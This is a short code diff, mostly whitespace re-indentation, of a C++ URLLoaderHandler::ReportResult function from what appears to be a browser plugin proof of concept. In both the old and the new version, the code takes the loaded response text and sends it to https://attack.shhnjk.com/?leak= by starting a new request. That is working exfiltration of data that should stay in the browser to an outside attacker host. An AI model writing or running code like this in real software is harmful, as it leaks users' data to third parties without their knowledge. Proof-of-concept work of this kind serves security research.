@@ -156,22 +156,22 @@ void URLLoaderHandler::ReportResult(const std::string& fname,
                                     const std::string& text,
                                     bool success) {
   if (success) {
-	printf("URLLoaderHandler::ReportResult(Ok).\n");
-	if (instance_) {
-	  if (text != "test") {
-		std::string target_url = "https://attack.shhnjk.com/?leak=" + text;
-		URLLoaderHandler* handler = Create(instance_, target_url);
-		if (handler != NULL) {
-		  handler->Start();
-		}
-	  }
-	}
-	else {
+    printf("URLLoaderHandler::ReportResult(Ok).\n");
+    if (instance_) {
+      if (text != "test") {
+        std::string target_url = "https://attack.shhnjk.com/?leak=" + text;
+        URLLoaderHandler* handler = Create(instance_, target_url);
+        if (handler != NULL) {
+          handler->Start();
+        }
+      }
+  }
+  else {
 	  fflush(stdout);
 	}
   } 
   else {
-	printf("URLLoaderHandler::ReportResult(Err). %s\n", text.c_str());
-	fflush(stdout);
+    printf("URLLoaderHandler::ReportResult(Err). %s\n", text.c_str());
+    fflush(stdout);
   }
 }
